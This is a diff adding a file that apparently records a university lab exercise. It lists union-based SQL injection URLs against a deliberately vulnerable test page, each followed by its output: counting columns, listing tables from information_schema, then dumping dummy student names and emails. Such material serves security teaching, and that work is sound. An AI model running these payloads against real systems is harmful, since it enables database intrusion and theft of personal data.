@@ -1,0 +1,42 @@
+http://hackme.mimuw.edu.pl/test.php?id=1' order by 8 -- -
+http://hackme.mimuw.edu.pl/test.php?id=1' order by 7 -- -
+
+<siedem kolumn w obecnej tabeli>
+
+
+http://hackme.mimuw.edu.pl/test.php?id=1' union select 1,2,3,4,5,6,7 -- -
+
+Imie: 2
+
+
+http://hackme.mimuw.edu.pl/test.php?id=1' union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database() -- -
+
+Imie: studenci
+
+
+http://hackme.mimuw.edu.pl/test.php?id=1' union select 1,concat_ws(' ', table_schema, table_name, column_name),3,4,5,6,7 from information_schema.columns where table_schema != 'information_schema' -- -
+
+Imie: hcm studenci id
+Imie: hcm studenci fname
+Imie: hcm studenci lname
+Imie: hcm studenci email
+Imie: hcm studenci inne
+Imie: hcm studenci inne1
+Imie: hcm studenci inne2
+Imie: hcm2018 hackme1 id
+Imie: hcm2018 hackme1 imie
+Imie: hcm2018 hackme1 nazwisko
+Imie: hcm2018 hackme1 adres_email
+
+
+http://hackme.mimuw.edu.pl/test.php?id=1' union select 1,concat_ws(' ', 'id:', id, ', fname:', fname, ', lname:', lname, ', email:', email, ', inne:', inne, ', inne1:', inne1, ', inne2:', inne2),3,4,5,6,7 from studenci -- -
+
+Imie: id: 1 , fname: Jan , lname: Kowalski , email: jk@mimuw.local , inne: , inne1: , inne2:
+Imie: id: 10 , fname: Jan , lname: Kowal , email: jko@mimuw.local , inne: , inne1: , inne2:
+Imie: id: 100 , fname: Jan , lname: Kowalski , email: jka@mimuw.local , inne: , inne1: , inne2:
+
+
+http://hackme.mimuw.edu.pl/test.php?id=1' union select 1,concat_ws(' ', 'id:', id, ', imie:', imie, ', nazwisko:', nazwisko, ', adres_email:', adres_email),3,4,5,6,7 from hcm2018.hackme1 -- -
+
+Imie: Jan
+Imie: id: 2018 , imie: Hack , nazwisko: Me , adres_email: hack.me@mimuw.local
